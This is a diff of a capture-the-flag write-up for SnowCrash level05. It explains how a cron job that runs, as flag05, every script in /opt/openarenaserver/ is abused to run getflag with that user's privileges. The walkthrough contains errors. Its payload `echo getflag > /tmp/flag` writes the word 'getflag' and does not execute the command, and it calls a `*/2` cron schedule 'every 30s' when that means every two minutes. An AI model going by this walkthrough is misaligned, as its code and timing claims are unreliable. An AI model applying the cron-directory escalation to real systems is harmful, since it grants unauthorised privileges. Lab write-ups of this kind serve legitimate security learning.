@@ -1,24 +1,31 @@
-# This time after we logged in! we received a mail
-# We checked the mail: cat /var/mail/level05
+# Find the password of Flag05
 
-# We found:
-*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
-
-# It's a cron table that execute the script openarenaserver every 30s
-
-# We checked the script, and found that he execute shell scripts in the directory:
-/opt/openarenaserver/
-
-# Create an empty file
-touch /tmp/flag
-
-# We created a script in this directory to let the main script programmed by the crontab execute 'getflag' command
-# Script:
-#==================================================
-    #!/bin/sh
-
-    echo getflag > /tmp/flag
-#==================================================
+Once we logged in, we received a mail.
 
 
-# After 30s we got the flag in the file: /tmp/flag
+```
+$ cat /var/mail/level05
+$ */2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
+```
+
+## Translation :
+The mail means that crontab executed a script every 30s
+On run, the script `/usr/sbin/openarenaserver` execute all the shell scripts in the directory `/opt/openarenaserver/` and remove them.
+
+#### Could you run our getflag please ?
+We create a file to log in the result of the script that will be run by the crontab `touch /tmp/flag` .
+
+We create the following script in the `/opt/openarenaserver/` directory.
+
+```
+#!/bin/sh
+
+echo getflag > /tmp/flag
+```
+
+Once it's run and deleted, we simply cat the `/tmp/flag`
+
+## TADAAAAAAA, It's ... 
+[The next level flag](https://github.com/XD-OB/snowcrash/blob/master/level05/flag)
+
+_tobecontinued_
